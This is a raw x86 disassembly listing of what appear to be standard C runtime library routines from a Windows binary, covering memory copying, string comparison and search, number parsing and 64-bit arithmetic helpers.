  426a50:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426a54:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426a58:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426a5c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426a60:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426a64:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426a68:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426a6c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426a70:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426a74:	lea    eax,[ecx*4+0x0]
  426a7b:	add    esi,eax
  426a7d:	add    edi,eax
  426a7f:	jmp    DWORD PTR [edx*4+0x426a88]
  426a86:	mov    edi,edi
  426a88:	cwde   
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [eax-0x4fffbd96],ah
  426a91:	push   0x42
  426a93:	add    ah,al
  426a95:	push   0x42
  426a97:	add    BYTE PTR [ebx+0x5f5e0845],cl
  426a9d:	leave  
  426a9e:	ret    
  426a9f:	nop
  426aa0:	mov    al,BYTE PTR [esi+0x3]
  426aa3:	mov    BYTE PTR [edi+0x3],al
  426aa6:	mov    eax,DWORD PTR [ebp+0x8]
  426aa9:	pop    esi
  426aaa:	pop    edi
  426aab:	leave  
  426aac:	ret    
  426aad:	lea    ecx,[ecx+0x0]
  426ab0:	mov    al,BYTE PTR [esi+0x3]
  426ab3:	mov    BYTE PTR [edi+0x3],al
  426ab6:	mov    al,BYTE PTR [esi+0x2]
  426ab9:	mov    BYTE PTR [edi+0x2],al
  426abc:	mov    eax,DWORD PTR [ebp+0x8]
  426abf:	pop    esi
  426ac0:	pop    edi
  426ac1:	leave  
  426ac2:	ret    
  426ac3:	nop
  426ac4:	mov    al,BYTE PTR [esi+0x3]
  426ac7:	mov    BYTE PTR [edi+0x3],al
  426aca:	mov    al,BYTE PTR [esi+0x2]
  426acd:	mov    BYTE PTR [edi+0x2],al
  426ad0:	mov    al,BYTE PTR [esi+0x1]
  426ad3:	mov    BYTE PTR [edi+0x1],al
  426ad6:	mov    eax,DWORD PTR [ebp+0x8]
  426ad9:	pop    esi
  426ada:	pop    edi
  426adb:	leave  
  426adc:	ret    
  426add:	push   ebp
  426ade:	mov    ebp,esp
  426ae0:	sub    esp,0xc
  426ae3:	mov    eax,ds:0x45c430
  426ae8:	xor    eax,DWORD PTR [ebp+0x4]
  426aeb:	and    BYTE PTR [ebp-0x6],0x0
  426aef:	push   0x6
  426af1:	mov    DWORD PTR [ebp-0x4],eax
  426af4:	lea    eax,[ebp-0xc]
  426af7:	push   eax
  426af8:	push   0x1004
  426afd:	push   DWORD PTR [ebp+0x8]
  426b00:	call   DWORD PTR ds:0x4280dc
  426b06:	test   eax,eax
  426b08:	jne    0x426b0f
  426b0a:	or     eax,0xffffffff
  426b0d:	jmp    0x426b19
  426b0f:	lea    eax,[ebp-0xc]
  426b12:	push   eax
  426b13:	call   0x426e1e
  426b18:	pop    ecx
  426b19:	mov    ecx,DWORD PTR [ebp-0x4]
  426b1c:	xor    ecx,DWORD PTR [ebp+0x4]
  426b1f:	call   0x423f2c
  426b24:	leave  
  426b25:	ret    
  426b26:	push   0x38
  426b28:	push   0x428ea8
  426b2d:	call   0x423858
  426b32:	mov    eax,ds:0x45c430
  426b37:	xor    eax,DWORD PTR [ebp+0x4]
  426b3a:	mov    DWORD PTR [ebp-0x1c],eax
  426b3d:	xor    edi,edi
  426b3f:	mov    DWORD PTR [ebp-0x20],edi
  426b42:	mov    DWORD PTR [ebp-0x24],edi
  426b45:	mov    eax,DWORD PTR [ebp+0x14]
  426b48:	mov    ebx,DWORD PTR [eax]
  426b4a:	mov    DWORD PTR [ebp-0x28],ebx
  426b4d:	mov    DWORD PTR [ebp-0x2c],edi
  426b50:	mov    eax,DWORD PTR [ebp+0x8]
  426b53:	cmp    eax,DWORD PTR [ebp+0xc]
  426b56:	je     0x426ccf
  426b5c:	lea    ecx,[ebp-0x40]
  426b5f:	push   ecx
  426b60:	push   eax
  426b61:	mov    esi,DWORD PTR ds:0x4280a0
  426b67:	call   esi
  426b69:	test   eax,eax
  426b6b:	je     0x426b8d
  426b6d:	cmp    DWORD PTR [ebp-0x40],0x1
  426b71:	jne    0x426b8d
  426b73:	lea    eax,[ebp-0x40]
  426b76:	push   eax
  426b77:	push   DWORD PTR [ebp+0xc]
  426b7a:	call   esi
  426b7c:	test   eax,eax
  426b7e:	je     0x426b8d
  426b80:	cmp    DWORD PTR [ebp-0x40],0x1
  426b84:	jne    0x426b8d
  426b86:	mov    DWORD PTR [ebp-0x2c],0x1
  426b8d:	cmp    DWORD PTR [ebp-0x2c],edi
  426b90:	je     0x426bac
  426b92:	cmp    ebx,0xffffffff
  426b95:	je     0x426b9b
  426b97:	mov    esi,ebx
  426b99:	jmp    0x426ba7
  426b9b:	push   DWORD PTR [ebp+0x10]
  426b9e:	call   0x423e70
  426ba3:	pop    ecx
  426ba4:	mov    esi,eax
  426ba6:	inc    esi
  426ba7:	mov    DWORD PTR [ebp-0x44],esi
  426baa:	jmp    0x426baf
  426bac:	mov    esi,DWORD PTR [ebp-0x44]
  426baf:	cmp    DWORD PTR [ebp-0x2c],edi
  426bb2:	jne    0x426bce
  426bb4:	push   edi
  426bb5:	push   edi
  426bb6:	push   ebx
  426bb7:	push   DWORD PTR [ebp+0x10]
  426bba:	push   0x1
  426bbc:	push   DWORD PTR [ebp+0x8]
  426bbf:	call   DWORD PTR ds:0x4280cc
  426bc5:	mov    esi,eax
  426bc7:	mov    DWORD PTR [ebp-0x44],esi
  426bca:	cmp    esi,edi
  426bcc:	je     0x426c26
  426bce:	mov    DWORD PTR [ebp-0x4],edi
  426bd1:	lea    eax,[esi+esi*1]
  426bd4:	add    eax,0x3
  426bd7:	and    eax,0xfffffffc
  426bda:	call   0x4238b0
  426bdf:	mov    DWORD PTR [ebp-0x18],esp
  426be2:	mov    ebx,esp
  426be4:	mov    DWORD PTR [ebp-0x48],ebx
  426be7:	lea    eax,[esi+esi*1]
  426bea:	push   eax
  426beb:	push   edi
  426bec:	push   ebx
  426bed:	call   0x426160
  426bf2:	add    esp,0xc
  426bf5:	or     DWORD PTR [ebp-0x4],0xffffffff
  426bf9:	jmp    0x426c12
  426bfb:	xor    eax,eax
  426bfd:	inc    eax
  426bfe:	ret    
  426bff:	mov    esp,DWORD PTR [ebp-0x18]
  426c02:	call   0x426cf5
  426c07:	xor    edi,edi
  426c09:	xor    ebx,ebx
  426c0b:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c0f:	mov    esi,DWORD PTR [ebp-0x44]
  426c12:	cmp    ebx,edi
  426c14:	jne    0x426c34
  426c16:	push   esi
  426c17:	push   0x2
  426c19:	call   0x424978
  426c1e:	pop    ecx
  426c1f:	pop    ecx
  426c20:	mov    ebx,eax
  426c22:	cmp    ebx,edi
  426c24:	jne    0x426c2d
  426c26:	xor    eax,eax
  426c28:	jmp    0x426ce1
  426c2d:	mov    DWORD PTR [ebp-0x24],0x1
  426c34:	push   esi
  426c35:	push   ebx
  426c36:	push   DWORD PTR [ebp-0x28]
  426c39:	push   DWORD PTR [ebp+0x10]
  426c3c:	push   0x1
  426c3e:	push   DWORD PTR [ebp+0x8]
  426c41:	call   DWORD PTR ds:0x4280cc
  426c47:	test   eax,eax
  426c49:	je     0x426cd2
  426c4f:	cmp    DWORD PTR [ebp+0x18],edi
  426c52:	je     0x426c74
  426c54:	push   edi
  426c55:	push   edi
  426c56:	push   DWORD PTR [ebp+0x1c]
  426c59:	push   DWORD PTR [ebp+0x18]
  426c5c:	push   esi
  426c5d:	push   ebx
  426c5e:	push   edi
  426c5f:	push   DWORD PTR [ebp+0xc]
  426c62:	call   DWORD PTR ds:0x428050
  426c68:	test   eax,eax
  426c6a:	je     0x426cd2
  426c6c:	mov    eax,DWORD PTR [ebp+0x18]
  426c6f:	mov    DWORD PTR [ebp-0x20],eax
  426c72:	jmp    0x426cd2
  426c74:	cmp    DWORD PTR [ebp-0x2c],edi
  426c77:	jne    0x426c8f
  426c79:	push   edi
  426c7a:	push   edi
  426c7b:	push   edi
  426c7c:	push   edi
  426c7d:	push   esi
  426c7e:	push   ebx
  426c7f:	push   edi
  426c80:	push   DWORD PTR [ebp+0xc]
  426c83:	call   DWORD PTR ds:0x428050
  426c89:	mov    esi,eax
  426c8b:	cmp    esi,edi
  426c8d:	je     0x426cd2
  426c8f:	push   esi
  426c90:	push   0x1
  426c92:	call   0x424978
  426c97:	pop    ecx
  426c98:	pop    ecx
  426c99:	mov    DWORD PTR [ebp-0x20],eax
  426c9c:	cmp    eax,edi
  426c9e:	je     0x426cd2
  426ca0:	push   edi
  426ca1:	push   edi
  426ca2:	push   esi
  426ca3:	push   eax
  426ca4:	push   esi
  426ca5:	push   ebx
  426ca6:	push   edi
  426ca7:	push   DWORD PTR [ebp+0xc]
  426caa:	call   DWORD PTR ds:0x428050
  426cb0:	cmp    eax,edi
  426cb2:	jne    0x426cc2
  426cb4:	push   DWORD PTR [ebp-0x20]
  426cb7:	call   0x42446a
  426cbc:	pop    ecx
  426cbd:	mov    DWORD PTR [ebp-0x20],edi
  426cc0:	jmp    0x426cd2
  426cc2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426cc6:	je     0x426cd2
  426cc8:	mov    ecx,DWORD PTR [ebp+0x14]
  426ccb:	mov    DWORD PTR [ecx],eax
  426ccd:	jmp    0x426cd2
  426ccf:	mov    ebx,DWORD PTR [ebp-0x48]
  426cd2:	cmp    DWORD PTR [ebp-0x24],edi
  426cd5:	je     0x426cde
  426cd7:	push   ebx
  426cd8:	call   0x42446a
  426cdd:	pop    ecx
  426cde:	mov    eax,DWORD PTR [ebp-0x20]
  426ce1:	lea    esp,[ebp-0x54]
  426ce4:	mov    ecx,DWORD PTR [ebp-0x1c]
  426ce7:	xor    ecx,DWORD PTR [ebp+0x4]
  426cea:	call   0x423f2c
  426cef:	call   0x423893
  426cf4:	ret    
  426cf5:	push   ebp
  426cf6:	mov    ebp,esp
  426cf8:	sub    esp,0x48
  426cfb:	push   ebx
  426cfc:	push   esi
  426cfd:	push   edi
  426cfe:	push   0x4
  426d00:	pop    eax
  426d01:	call   0x4238b0
  426d06:	mov    ebx,esp
  426d08:	push   0x1c
  426d0a:	lea    eax,[ebp-0x24]
  426d0d:	push   eax
  426d0e:	push   ebx
  426d0f:	call   DWORD PTR ds:0x4280e8
  426d15:	test   eax,eax
  426d17:	je     0x426d8a
  426d19:	mov    edi,DWORD PTR [ebp-0x20]
  426d1c:	lea    eax,[ebp-0x48]
  426d1f:	push   eax
  426d20:	call   DWORD PTR ds:0x4280e4
  426d26:	mov    eax,DWORD PTR [ebp-0x44]
  426d29:	lea    esi,[eax-0x1]
  426d2c:	not    esi
  426d2e:	and    esi,ebx
  426d30:	sub    esi,eax
  426d32:	mov    DWORD PTR [ebp-0x4],eax
  426d35:	mov    eax,ds:0x45cac4
  426d3a:	mov    ecx,eax
  426d3c:	dec    ecx
  426d3d:	neg    ecx
  426d3f:	sbb    ecx,ecx
  426d41:	and    ecx,0xffff1000
  426d47:	add    ecx,0x11000
  426d4d:	add    ecx,edi
  426d4f:	cmp    esi,ecx
  426d51:	jb     0x426d8a
  426d53:	cmp    eax,0x1
  426d56:	je     0x426da2
  426d58:	mov    ebx,edi
  426d5a:	mov    edi,0x1000
  426d5f:	push   0x1c
  426d61:	lea    eax,[ebp-0x24]
  426d64:	push   eax
  426d65:	push   ebx
  426d66:	call   DWORD PTR ds:0x4280e8
  426d6c:	test   eax,eax
  426d6e:	je     0x426d8a
  426d70:	add    ebx,DWORD PTR [ebp-0x18]
  426d73:	test   DWORD PTR [ebp-0x14],edi
  426d76:	je     0x426d5f
  426d78:	test   BYTE PTR [ebp-0xf],0x1
  426d7c:	mov    ebx,DWORD PTR [ebp-0x24]
  426d7f:	je     0x426d86
  426d81:	xor    eax,eax
  426d83:	inc    eax
  426d84:	jmp    0x426dbe
  426d86:	cmp    esi,ebx
  426d88:	jae    0x426d8e
  426d8a:	xor    eax,eax
  426d8c:	jmp    0x426dbe
  426d8e:	push   0x4
  426d90:	push   edi
  426d91:	push   DWORD PTR [ebp-0x4]
  426d94:	push   ebx
  426d95:	call   DWORD PTR ds:0x4280ac
  426d9b:	mov    eax,ds:0x45cac4
  426da0:	jmp    0x426da4
  426da2:	mov    ebx,esi
  426da4:	dec    eax
  426da5:	neg    eax
  426da7:	sbb    eax,eax
  426da9:	and    eax,0x103
  426dae:	lea    ecx,[ebp-0x8]
  426db1:	push   ecx
  426db2:	inc    eax
  426db3:	push   eax
  426db4:	push   DWORD PTR [ebp-0x4]
  426db7:	push   ebx
  426db8:	call   DWORD PTR ds:0x428008
  426dbe:	lea    esp,[ebp-0x54]
  426dc1:	pop    edi
  426dc2:	pop    esi
  426dc3:	pop    ebx
  426dc4:	leave  
  426dc5:	ret    
  426dc6:	int3   
  426dc7:	int3   
  426dc8:	int3   
  426dc9:	int3   
  426dca:	int3   
  426dcb:	int3   
  426dcc:	int3   
  426dcd:	int3   
  426dce:	int3   
  426dcf:	int3   
  426dd0:	push   ebp
  426dd1:	mov    ebp,esp
  426dd3:	push   edi
  426dd4:	push   esi
  426dd5:	push   ebx
  426dd6:	mov    esi,DWORD PTR [ebp+0xc]
  426dd9:	mov    edi,DWORD PTR [ebp+0x8]
  426ddc:	mov    al,0xff
  426dde:	mov    edi,edi
  426de0:	or     al,al
  426de2:	je     0x426e16
  426de4:	mov    al,BYTE PTR [esi]
  426de6:	add    esi,0x1
  426de9:	mov    ah,BYTE PTR [edi]
  426deb:	add    edi,0x1
  426dee:	cmp    ah,al
  426df0:	je     0x426de0
  426df2:	sub    al,0x41
  426df4:	cmp    al,0x1a
  426df6:	sbb    cl,cl
  426df8:	and    cl,0x20
  426dfb:	add    al,cl
  426dfd:	add    al,0x41
  426dff:	xchg   al,ah
  426e01:	sub    al,0x41
  426e03:	cmp    al,0x1a
  426e05:	sbb    cl,cl
  426e07:	and    cl,0x20
  426e0a:	add    al,cl
  426e0c:	add    al,0x41
  426e0e:	cmp    al,ah
  426e10:	je     0x426de0
  426e12:	sbb    al,al
  426e14:	sbb    al,0xff
  426e16:	movsx  eax,al
  426e19:	pop    ebx
  426e1a:	pop    esi
  426e1b:	pop    edi
  426e1c:	leave  
  426e1d:	ret    
  426e1e:	push   esi
  426e1f:	push   edi
  426e20:	call   0x42370d
  426e25:	mov    edi,DWORD PTR [eax+0x64]
  426e28:	cmp    edi,DWORD PTR ds:0x45c58c
  426e2e:	je     0x426e37
  426e30:	call   0x424bbf
  426e35:	mov    edi,eax
  426e37:	mov    esi,DWORD PTR [esp+0xc]
  426e3b:	cmp    DWORD PTR [edi+0x28],0x1
  426e3f:	movzx  eax,BYTE PTR [esi]
  426e42:	jle    0x426e52
  426e44:	push   0x8
  426e46:	push   eax
  426e47:	push   edi
  426e48:	call   0x426ea6
  426e4d:	add    esp,0xc
  426e50:	jmp    0x426e5c
  426e52:	mov    ecx,DWORD PTR [edi+0x48]
  426e55:	movzx  eax,BYTE PTR [ecx+eax*2]
  426e59:	and    eax,0x8
  426e5c:	test   eax,eax
  426e5e:	je     0x426e63
  426e60:	inc    esi
  426e61:	jmp    0x426e3b
  426e63:	movzx  ecx,BYTE PTR [esi]
  426e66:	inc    esi
  426e67:	cmp    ecx,0x2d
  426e6a:	mov    edx,ecx
  426e6c:	je     0x426e73
  426e6e:	cmp    ecx,0x2b
  426e71:	jne    0x426e77
  426e73:	movzx  ecx,BYTE PTR [esi]
  426e76:	inc    esi
  426e77:	xor    eax,eax
  426e79:	cmp    ecx,0x30
  426e7c:	jl     0x426e88
  426e7e:	cmp    ecx,0x39
  426e81:	jg     0x426e88
  426e83:	sub    ecx,0x30
  426e86:	jmp    0x426e8b
  426e88:	or     ecx,0xffffffff
  426e8b:	cmp    ecx,0xffffffff
  426e8e:	je     0x426e9c
  426e90:	lea    eax,[eax+eax*4]
  426e93:	lea    eax,[ecx+eax*2]
  426e96:	movzx  ecx,BYTE PTR [esi]
  426e99:	inc    esi
  426e9a:	jmp    0x426e79
  426e9c:	cmp    edx,0x2d
  426e9f:	pop    edi
  426ea0:	pop    esi
  426ea1:	jne    0x426ea5
  426ea3:	neg    eax
  426ea5:	ret    
  426ea6:	push   ebp
  426ea7:	mov    ebp,esp
  426ea9:	push   ecx
  426eaa:	mov    eax,DWORD PTR [ebp+0xc]
  426ead:	lea    ecx,[eax+0x1]
  426eb0:	cmp    ecx,0x100
  426eb6:	mov    ecx,DWORD PTR [ebp+0x8]
  426eb9:	ja     0x426ec4
  426ebb:	mov    ecx,DWORD PTR [ecx+0x48]
  426ebe:	movzx  eax,WORD PTR [ecx+eax*2]
  426ec2:	jmp    0x426f18
  426ec4:	push   esi
  426ec5:	mov    edx,eax
  426ec7:	sar    edx,0x8
  426eca:	push   edi
  426ecb:	mov    edi,DWORD PTR [ecx+0x48]
  426ece:	movzx  esi,dl
  426ed1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426ed6:	pop    edi
  426ed7:	pop    esi
  426ed8:	je     0x426ee9
  426eda:	and    BYTE PTR [ebp-0x2],0x0
  426ede:	push   0x2
  426ee0:	mov    BYTE PTR [ebp-0x3],al
  426ee3:	mov    BYTE PTR [ebp-0x4],dl
  426ee6:	pop    eax
  426ee7:	jmp    0x426ef3
  426ee9:	and    BYTE PTR [ebp-0x3],0x0
  426eed:	mov    BYTE PTR [ebp-0x4],al
  426ef0:	xor    eax,eax
  426ef2:	inc    eax
  426ef3:	push   0x1
  426ef5:	push   DWORD PTR [ecx+0x14]
  426ef8:	push   DWORD PTR [ecx+0x4]
  426efb:	lea    ecx,[ebp+0xe]
  426efe:	push   ecx
  426eff:	push   eax
  426f00:	lea    eax,[ebp-0x4]
  426f03:	push   eax
  426f04:	push   0x1
  426f06:	call   0x425f88
  426f0b:	add    esp,0x1c
  426f0e:	test   eax,eax
  426f10:	jne    0x426f14
  426f12:	leave  
  426f13:	ret    
  426f14:	movzx  eax,WORD PTR [ebp+0xe]
  426f18:	and    eax,DWORD PTR [ebp+0x10]
  426f1b:	leave  
  426f1c:	ret    
  426f1d:	int3   
  426f1e:	int3   
  426f1f:	int3   
  426f20:	mov    eax,DWORD PTR [esp+0x8]
  426f24:	mov    ecx,DWORD PTR [esp+0x10]
  426f28:	or     ecx,eax
  426f2a:	mov    ecx,DWORD PTR [esp+0xc]
  426f2e:	jne    0x426f39
  426f30:	mov    eax,DWORD PTR [esp+0x4]
  426f34:	mul    ecx
  426f36:	ret    0x10
  426f39:	push   ebx
  426f3a:	mul    ecx
  426f3c:	mov    ebx,eax
  426f3e:	mov    eax,DWORD PTR [esp+0x8]
  426f42:	mul    DWORD PTR [esp+0x14]
  426f46:	add    ebx,eax
  426f48:	mov    eax,DWORD PTR [esp+0x8]
  426f4c:	mul    ecx
  426f4e:	add    edx,ebx
  426f50:	pop    ebx
  426f51:	ret    0x10
  426f54:	int3   
  426f55:	int3   
  426f56:	int3   
  426f57:	int3   
  426f58:	int3   
  426f59:	int3   
  426f5a:	int3   
  426f5b:	int3   
  426f5c:	int3   
  426f5d:	int3   
  426f5e:	int3   
  426f5f:	int3   
  426f60:	push   ebp
  426f61:	mov    ebp,esp
  426f63:	push   edi
  426f64:	push   esi
  426f65:	push   ebx
  426f66:	mov    ecx,DWORD PTR [ebp+0x10]
  426f69:	or     ecx,ecx
  426f6b:	je     0x426fba
  426f6d:	mov    esi,DWORD PTR [ebp+0x8]
  426f70:	mov    edi,DWORD PTR [ebp+0xc]
  426f73:	mov    bh,0x41
  426f75:	mov    bl,0x5a
  426f77:	mov    dh,0x20
  426f79:	lea    ecx,[ecx+0x0]
  426f7c:	mov    ah,BYTE PTR [esi]
  426f7e:	or     ah,ah
  426f80:	mov    al,BYTE PTR [edi]
  426f82:	je     0x426fab
  426f84:	or     al,al
  426f86:	je     0x426fab
  426f88:	add    esi,0x1
  426f8b:	add    edi,0x1
  426f8e:	cmp    ah,bh
  426f90:	jb     0x426f98
  426f92:	cmp    ah,bl
  426f94:	ja     0x426f98
  426f96:	add    ah,dh
  426f98:	cmp    al,bh
  426f9a:	jb     0x426fa2
  426f9c:	cmp    al,bl
  426f9e:	ja     0x426fa2
  426fa0:	add    al,dh
  426fa2:	cmp    ah,al
  426fa4:	jne    0x426fb1
  426fa6:	sub    ecx,0x1
  426fa9:	jne    0x426f7c
  426fab:	xor    ecx,ecx
  426fad:	cmp    ah,al
  426faf:	je     0x426fba
  426fb1:	mov    ecx,0xffffffff
  426fb6:	jb     0x426fba
  426fb8:	neg    ecx
  426fba:	mov    eax,ecx
  426fbc:	pop    ebx
  426fbd:	pop    esi
  426fbe:	pop    edi
  426fbf:	leave  
  426fc0:	ret    
  426fc1:	int3   
  426fc2:	int3   
  426fc3:	int3   
  426fc4:	int3   
  426fc5:	int3   
  426fc6:	int3   
  426fc7:	int3   
  426fc8:	int3   
  426fc9:	int3   
  426fca:	int3   
  426fcb:	int3   
  426fcc:	int3   
  426fcd:	int3   
  426fce:	int3   
  426fcf:	int3   
  426fd0:	push   esi
  426fd1:	mov    eax,DWORD PTR [esp+0x14]
  426fd5:	or     eax,eax
  426fd7:	jne    0x427001
  426fd9:	mov    ecx,DWORD PTR [esp+0x10]
  426fdd:	mov    eax,DWORD PTR [esp+0xc]
  426fe1:	xor    edx,edx
  426fe3:	div    ecx
  426fe5:	mov    ebx,eax
  426fe7:	mov    eax,DWORD PTR [esp+0x8]
  426feb:	div    ecx
  426fed:	mov    esi,eax
  426fef:	mov    eax,ebx
  426ff1:	mul    DWORD PTR [esp+0x10]
  426ff5:	mov    ecx,eax
  426ff7:	mov    eax,esi
  426ff9:	mul    DWORD PTR [esp+0x10]
  426ffd:	add    edx,ecx
  426fff:	jmp    0x427048
  427001:	mov    ecx,eax
  427003:	mov    ebx,DWORD PTR [esp+0x10]
  427007:	mov    edx,DWORD PTR [esp+0xc]
  42700b:	mov    eax,DWORD PTR [esp+0x8]
  42700f:	shr    ecx,1
  427011:	rcr    ebx,1
  427013:	shr    edx,1
  427015:	rcr    eax,1
  427017:	or     ecx,ecx
  427019:	jne    0x42700f
  42701b:	div    ebx
  42701d:	mov    esi,eax
  42701f:	mul    DWORD PTR [esp+0x14]
  427023:	mov    ecx,eax
  427025:	mov    eax,DWORD PTR [esp+0x10]
  427029:	mul    esi
  42702b:	add    edx,ecx
  42702d:	jb     0x42703d
  42702f:	cmp    edx,DWORD PTR [esp+0xc]
  427033:	ja     0x42703d
  427035:	jb     0x427046
  427037:	cmp    eax,DWORD PTR [esp+0x8]
  42703b:	jbe    0x427046
  42703d:	dec    esi
  42703e:	sub    eax,DWORD PTR [esp+0x10]
  427042:	sbb    edx,DWORD PTR [esp+0x14]
  427046:	xor    ebx,ebx
  427048:	sub    eax,DWORD PTR [esp+0x8]
  42704c:	sbb    edx,DWORD PTR [esp+0xc]
  427050:	neg    edx
  427052:	neg    eax
  427054:	sbb    edx,0x0
  427057:	mov    ecx,edx
  427059:	mov    edx,ebx
  42705b:	mov    ebx,ecx
  42705d:	mov    ecx,eax
  42705f:	mov    eax,esi
  427061:	pop    esi
  427062:	ret    0x10
  427065:	int3   
  427066:	int3   
  427067:	int3   
  427068:	int3   
  427069:	int3   
  42706a:	int3   
  42706b:	int3   
  42706c:	int3   
  42706d:	int3   
  42706e:	int3   
  42706f:	int3   
  427070:	lea    eax,[edx-0x1]
  427073:	pop    ebx
  427074:	ret    
  427075:	lea    esp,[esp+0x0]
  42707c:	lea    esp,[esp+0x0]
  427080:	xor    eax,eax
  427082:	mov    al,BYTE PTR [esp+0x8]
  427086:	push   ebx
  427087:	mov    ebx,eax
  427089:	shl    eax,0x8
  42708c:	mov    edx,DWORD PTR [esp+0x8]
  427090:	test   edx,0x3
  427096:	je     0x4270ad
  427098:	mov    cl,BYTE PTR [edx]
  42709a:	add    edx,0x1
  42709d:	cmp    cl,bl
  42709f:	je     0x427070
  4270a1:	test   cl,cl
  4270a3:	je     0x4270f6
  4270a5:	test   edx,0x3
  4270ab:	jne    0x427098
  4270ad:	or     ebx,eax
  4270af:	push   edi
  4270b0:	mov    eax,ebx
  4270b2:	shl    ebx,0x10
  4270b5:	push   esi
  4270b6:	or     ebx,eax
  4270b8:	mov    ecx,DWORD PTR [edx]
  4270ba:	mov    edi,0x7efefeff
  4270bf:	mov    eax,ecx
  4270c1:	mov    esi,edi
  4270c3:	xor    ecx,ebx
  4270c5:	add    esi,eax
  4270c7:	add    edi,ecx
  4270c9:	xor    ecx,0xffffffff
  4270cc:	xor    eax,0xffffffff
  4270cf:	xor    ecx,edi
  4270d1:	xor    eax,esi
  4270d3:	add    edx,0x4
  4270d6:	and    ecx,0x81010100
  4270dc:	jne    0x4270fa
  4270de:	and    eax,0x81010100
  4270e3:	je     0x4270b8
  4270e5:	and    eax,0x1010100
  4270ea:	jne    0x4270f4
  4270ec:	and    esi,0x80000000
  4270f2:	jne    0x4270b8
  4270f4:	pop    esi
  4270f5:	pop    edi
  4270f6:	pop    ebx
  4270f7:	xor    eax,eax
  4270f9:	ret    
  4270fa:	mov    eax,DWORD PTR [edx-0x4]
  4270fd:	cmp    al,bl
  4270ff:	je     0x427137
  427101:	test   al,al
  427103:	je     0x4270f4
  427105:	cmp    ah,bl
  427107:	je     0x427130
  427109:	test   ah,ah
  42710b:	je     0x4270f4
  42710d:	shr    eax,0x10
  427110:	cmp    al,bl
  427112:	je     0x427129
  427114:	test   al,al
  427116:	je     0x4270f4
  427118:	cmp    ah,bl
  42711a:	je     0x427122
  42711c:	test   ah,ah
  42711e:	je     0x4270f4
  427120:	jmp    0x4270b8
  427122:	pop    esi
  427123:	pop    edi
  427124:	lea    eax,[edx-0x1]
  427127:	pop    ebx
  427128:	ret    
  427129:	lea    eax,[edx-0x2]
  42712c:	pop    esi
  42712d:	pop    edi
  42712e:	pop    ebx
  42712f:	ret    
  427130:	lea    eax,[edx-0x3]
  427133:	pop    esi
  427134:	pop    edi
  427135:	pop    ebx
  427136:	ret    
  427137:	lea    eax,[edx-0x4]
  42713a:	pop    esi
  42713b:	pop    edi
  42713c:	pop    ebx
  42713d:	ret    
  42713e:	jmp    DWORD PTR ds:0x4280e0
